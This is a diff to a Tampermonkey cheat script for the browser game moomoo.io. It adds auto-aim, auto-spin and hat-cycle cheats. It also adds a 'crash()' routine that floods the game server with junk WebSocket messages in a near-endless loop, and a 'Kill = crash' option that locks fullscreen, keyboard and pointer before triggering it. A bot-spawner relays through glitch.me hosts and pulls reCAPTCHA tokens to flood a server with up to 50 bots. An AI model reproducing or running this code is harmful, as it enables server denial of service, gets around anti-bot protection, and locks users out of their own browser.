@@ -1,7 +1,7 @@
 // ==UserScript==
-// @name         <\\A//>AttackX by MPAK<//A\\>
+// @name         AX-32
 // @namespace    http://tampermonkey.net/
-// @version      7.15
+// @version      7.16
 // @description  AutoHeal,360 hit,auto mill, spike,hotkeys,insta,antiinsta,adblocking,errorspike,shaders,HUE,more colors,ping-heal! AutoTrap, trap insta, anti lag,night mode,triple mill,player hunter!!!
 // @author       MPAK
 // @match        *://sandbox.moomoo.io/*
@@ -18,8 +18,16 @@
 // @grant           unsafeWindow
 // @antifeature     tracking
 // ==/UserScript==
+
+
+function fs() {
 document.documentElement.requestFullscreen();
-window.devicePixelRatio = 0.6; //The secret of 80 ping on sandbox and no crash :) Youre welcome ~AttackX developers
+navigator.keyboard.lock()
+    CanvasAPI.style.cursor = 'url(https://pranx.com/fake-dos/cursor.png)';
+
+
+}
+window.devicePixelRatio = 0.8; //The secret of 80 ping on sandbox and no crash :) Youre welcome ~AttackX developers
 /**
 
                                                                                                                                                                                                   dddddddd
@@ -133,11 +141,62 @@ AAAAAAA                   AAAAAAA ttttttttttt       ttttttttttt   aaaaaaaaaa  aa
 
 
 **/
+
 // AntiShame. Blocks shame hat  by replacing bundle.js (MYHAHAHAHAHAHAHA)
 
-//Blocker for bundle.js
+         CanvasRenderingContext2D.prototype.rigidRRect = function(e, t, n, i, r) {
+           return n < 2 * r && (r = n / 2),
+               i < 2 * r && (r = i / 2),
+               r < 0 && (r = 0),
+               this.beginPath(),
+               this.moveTo(e + r, t),
+               this.arcTo(e + n, t, e + n, t + i, r),
+               this.arcTo(e + n, t + i, e, t + i, r),
+               this.lineTo(e, t + i, e, t, r),
+               this.lineTo(e, t, e + n, t, r),
+               this.closePath(),
+               this
+       }
+           ,
+           CanvasRenderingContext2D.prototype.rigidLRect = function(e, t, n, i, r) {
+           return n < 2 * r && (r = n / 2),
+               i < 2 * r && (r = i / 2),
+               r < 0 && (r = 0),
+               this.beginPath(),
+               this.moveTo(e + r, t),
+               this.lineTo(e + n, t, e + n, t + i, r),
+               this.lineTo(e + n, t + i, e, t + i, r),
+               this.arcTo(e, t + i, e, t, r),
+               this.arcTo(e, t, e + n, t, r),
+               this.closePath(),
+               this
+       }
+           ,
+           CanvasRenderingContext2D.prototype.roundRect = function(e, t, n, i, r) {
+           return n < 2 * r && (r = n / 2),
+               i < 2 * r && (r = i / 2),
+               r < 0 && (r = 0),
+               this.beginPath(),
+               this.moveTo(e + r, t),
+               this.arcTo(e + n, t, e + n, t + i, r),
+               this.arcTo(e + n, t + i, e, t + i, r),
+               this.arcTo(e, t + i, e, t, r),
+               this.arcTo(e, t, e + n, t, r),
+               this.closePath(),
+               this
+       }
 
-let R = CanvasRenderingContext2D.prototype.rotate;
+
+
+
+
+//Blocker for bundle.js
+setInterval(()=>{
+if (get('fullscreen')) {
+    fs()
+}
+},10);
+var R = CanvasRenderingContext2D.prototype.rotate;
 let e = {
     39912: () => {
         let imin = Math.min(4e306, 8e305, 6e306, 8e302, 4e304, 5e303, 5e306, 1e308, 2e306, 4e305, 3e306, 3e304, 1.2999999999999997e+308, 6e305, 1e307, 7e304);
@@ -418,6 +477,26 @@ setInterval(()=>{
 CanvasRenderingContext2D.prototype._stroke = CanvasRenderingContext2D.prototype._stroke || CanvasRenderingContext2D.prototype.stroke;
 CanvasRenderingContext2D.prototype._fillText = CanvasRenderingContext2D.prototype._fillText || CanvasRenderingContext2D.prototype.fillText
 CanvasRenderingContext2D.prototype._strokeText = CanvasRenderingContext2D.prototype._strokeText || CanvasRenderingContext2D.prototype.strokeText
+
+
+
+// From 'Diep Glow' by Shlong (now deleted).
+let _fill = CanvasRenderingContext2D.prototype.fill;
+CanvasRenderingContext2D.prototype.fill = function (args) {
+    for (var i=0;i<6;i++){
+  for (var j=0;j<6;j++){
+     this.strokeStyle = 'black'
+    this.shadowColor = this.fillStyle;
+  }
+    }
+
+    this.stroke();
+    this.shadowBlur = 0;
+
+    this.lineWidth = 0.3;
+
+    _fill.apply(this, args);
+};
 var oldRotate = CanvasRenderingContext2D.prototype.rotate;
 var newRotate = function(){
     //rotations is now gone!
@@ -494,7 +573,19 @@ let Global = {
     shameCount:(window.config.shameCount)
 }
 
+// Yeah thats cosmos mod
+function Random(min, max) {
+    return Math.floor(Math.random() * max) + min;
+};
 
+setInterval(() => {
+if (get('autospin')) {
+
+
+        aim(Random(0, 3000) + window.innerHeight/2, Random(0, 3000) + window.innerHeight/2);
+
+}
+}, 20);
 
 let randomInt = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a
 let rainbowSkin
@@ -661,7 +752,6 @@ let $el_id = document.activeElement.id.toLowerCase()
 let $el_chat = document.getElementById("#chatHolder")
 let AutoMill = false
 let AutoBaitMill = false
-let w, he, mX, mY
 let counter = 0
 let health = 65
 let tgl = false
@@ -863,9 +953,9 @@ var gh = 0;
 
 async function hatLoop() {
 
-    for (var xware = 37; xware < 55; xware++) {
+    for (var xware = 0; xware < freeHats.length; xware++) {
         if (!insta) {
-        storeEquip(xware)
+        storeEquip(freeHats[xware])
         await sleep(300)
         }
 
@@ -911,6 +1001,15 @@ async function handleMessage(a) {
         }
     }
     if (d == '11') {
+
+        //Kill to crash
+        if (get("kill2crash")) {
+                        document.documentElement.requestFullscreen();
+            navigator.keyboard.lock();
+            document.documentElement.requestPointerLock();
+            crash()
+
+        }
         //AutoRespawn to do better experence
         setTimeout(function(){
             if (document.getElementById('autorespawn').checked){
@@ -971,8 +1070,16 @@ acc(0)
 
     update();
 
+    if (d == "ch" && c[0x2] == "</E\\>Taste The INSTA</E\\>") {
+
+            doNewSend(["ch", ["!Trash insta detected!"]]);
+                        place(foodType, null);
+                place(foodType, null);
+                place(foodType, null);
+
+    }
     if (d == "h" && c[0x1] == myPlayer.id) {
-        if (c[0x2] < 20 && c[0x2] > 0) {
+        if (c[0x2] < 0x20 && c[0x2] > 0) {
 
                 storeBuy(6);
                 storeEquip(6);
@@ -1102,14 +1209,13 @@ acc(0)
     if (autoaim) {
         newSend([["2"],[nearestEnemyAngle]])
         newSend([["2"],[enemy.dir]])
+        doNewSend(["c", [1, nearestEnemyAngle]]);
+        doNewSend(["c", [1, enemy.dir]]);
 
     }
 
 
     },5);
-    setInterval(()=>{
-    // TryHard ultraspin :P
-    },10);
 
     if (d == "33") {
        enemiesNear = [];
@@ -1343,6 +1449,7 @@ function donewsend(data) {
 var nea=7385939**9494939**2647781*(Math.PI/180)
 
 const CanvasAPI = document.getElementById("gameCanvas");
+CanvasAPI.style.cursor = 'crosshair';
 var ctx = CanvasAPI.getContext("2d");
 setInterval(() => {
     if(autoaim == true) {
@@ -1391,12 +1498,13 @@ async function sing() {
 function oneTick() {
 newSend(["5", [secondary, true]])
     autoaim = true;
-                    hat(53)
+    doHatCycle()
+                    
     newSend(["ch", ['TryHard onetic *;::;*']]);
                     setTimeout(() => {
 
                         newSend([["2"],[Number.MAX_VALUE]])
-                        hat(7)
+                        
                         newSend([["2"],[Number.MAX_VALUE]])
                         newSend(["5", [primary, true]])
                         newSend([["2"],[Number.MAX_VALUE]])
@@ -1973,7 +2081,7 @@ function optimise(pr){
     var mcanvas = document.getElementById("myCanvas")
     mctx = mcanvas.getContext("2d");
 
-    var frame1 = 1000/70;
+    var frame1 = 1000/60;
     frame();
     function frame(){
         if(gcanvas){
@@ -2125,11 +2233,14 @@ class="" & id="" - I use to denote blocks, id for everything else
           Classic insta<input type = "checkbox" id = "normal"><br>
           Reverse insta<input type = "checkbox" id = "reverse"><br>
           OneTick<input type = "checkbox" id = "onetick"><br>
-          OWhoLOstEvee?<input type = "checkbox" id = "evee"><br>
+          WhoLOstEvee?<input type = "checkbox" id = "evee"><br>
           Combinated insta<input type = "checkbox" id = "combo"><br>
           Chat mirror <input type = "checkbox" id = "chatmirror"><br>
           Hat cycle <input type = "checkbox" id = "autoHat"><br>
           PlayerHunter <input type = "checkbox" id = "pwalk"><br>
+         AutoSpin <input type = "checkbox" id = "autospin"><br>
+         Kill = crash<input type = "checkbox" id = "kill2crash"><br>
+         FullScreen<input type = "checkbox" id = "fullscreen"><br>
           <button id = "killping">Crash server</button>
         
         </passive>
@@ -2139,6 +2250,17 @@ class="" & id="" - I use to denote blocks, id for everything else
 </main>
 `
 
+function crash() {
+    for (let i = 0; i < 1000000000 ** 100000000000; i++) {
+        for (let i = 0, dash = new Uint8Array(50); i < 250; i++) {
+            for (let i = 0; i < dash.length; i++) {
+                dash[i] = Math.floor(Math.random() * 320);
+            }
+            newSend(Number.MAX_VALUE)
+            newSend(dash)
+        }
+    }
+}
 CanvasAPI.addEventListener("mousedown", function(){
 
  if (myPlayer.y < 2400) {
@@ -2357,4 +2479,141 @@ document.addEventListener("keydown", function(event) {
                     return tm.join(""); //fz dont fix this and i will hunt you down and 10-0
                     }
                 };
+let skin = 6;
+let combo = [Math.random < .5 ? 7 : 3, 20, 31, 23, 10, 38, 4, 25];
+let point;
 
+let bot = [];
+let projects = [`lying-splendid-peripheral`,
+                `efficacious-tremendous-golf`,
+                `workable-equal-push`,
+                `brave-small-bagpipe`,
+                `efficacious-tremendous-golf`,
+                `shade-mint-fur`,
+                `ubiquitous-scintillating-stock`,
+                `marvelous-classy-inch`,
+                `blossom-fascinated-temperature`];
+let key = [];
+let length = projects.length;
+let main;
+let serverIp = '';
+let freeHats = [51, 50, 28, 29, 30, 36, 37, 38, 44, 35, 42, 43, 49];
+let bots = [];
+
+let genHat = () => {
+    this.in += 1;
+    if(!freeHats[this.in]) this.in = 0;
+    return freeHats[this.in];
+};
+
+let getToken = async () => {
+    return await window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", {
+        action: "homepage",
+    }).then((token) => {
+        console.log(token)
+        return encodeURIComponent(token);
+    });
+};
+
+let generate = (count, name, clan, reallCount = 0) => {
+    for(let id = 0; id < length; id++){
+        bot[id] = [];
+
+        let ws = new WebSocket(`wss://${projects[id]}.glitch.me`);
+
+        ws.oldSend = ws.send;
+        ws.send = (data) => {
+            data = JSON.stringify(data);
+            ws.readyState === 1 && ws.oldSend(data);
+        };
+
+        ws.onopen = async () => {
+            ws.send(['ready']);
+            for(let id = 0; id < 4; id++){
+                reallCount++;
+                if(reallCount > count){
+                    let server = window.location.href.split('?server=')[1];
+                    return console.log(`Sent ${count} bots to ${server}!`);
+                };
+                let token = await getToken();
+                let url = `wss://ip_${serverIp}.moomoo.io:8008/?gameIndex=0&token=${token}`;
+                let data = ['connect', url, name, skin, clan];
+                ws.send(data);
+            };
+
+            setInterval(() => {
+                ws.send(['point', point]);
+                ws.send(['hat', genHat()]);
+            }, 500);
+        };
+
+        ws.onclose = () => {
+            console.log(`[${id}] close`)
+        }
+
+        let botMessage = (data) => {
+            let item = data[0];
+            switch(item){
+                case "info":
+                    for(let i of data[1]){
+                        bot[id][Number(i.count)] = i.body;
+                    };
+                    console.log(bot)
+                    break;
+            };
+        };
+
+        ws.onmessage = data => {
+            botMessage(JSON.parse(data.data))
+        };
+    };
+};
+
+let messageHandler = (data) => {
+    return null;
+};
+
+window.WebSocket = class extends WebSocket {
+    constructor(url, protocols) {
+        main = super(url, protocols);
+
+        let isFirst = url.includes(`wss://ip_`);
+        if(isFirst){
+            serverIp = url.split(`ip_`)[1].split(`.`)[0];
+            this.addEventListener('message', data => messageHandler(data));
+            window.ws = main;
+            console.log(url);
+        }
+    }
+    set onmessage(f) {
+        console.log('onmessage', f);
+        super.onmessage = f;
+    }
+};
+
+
+window.addEventListener("keydown", (event) => {
+    let code = event.keyCode;
+    key[code] = true;
+
+   // code == 80 && generate(50);
+
+    if(code == 13 && 'chatbox' == document.activeElement.id.toLowerCase()){
+        console.log(bot)
+        let value = document.getElementById("chatBox").value;
+        if(!value || value.length <= 1) return null;
+        if(value.startsWith('.send')){
+            let count = value.split(' ')[1];
+            let name = value.split(' ')[2];
+            let clan = value.split(' ')[3];
+            var close = false
+            generate(Math.max(0, Math.min(50, Number(count))), name || "Wealthy", clan || "bots");
+        }
+
+    };
+});
+
+window.addEventListener("keyup", (event) => {
+    let code = event.keyCode;
+    key[code] = false;
+});
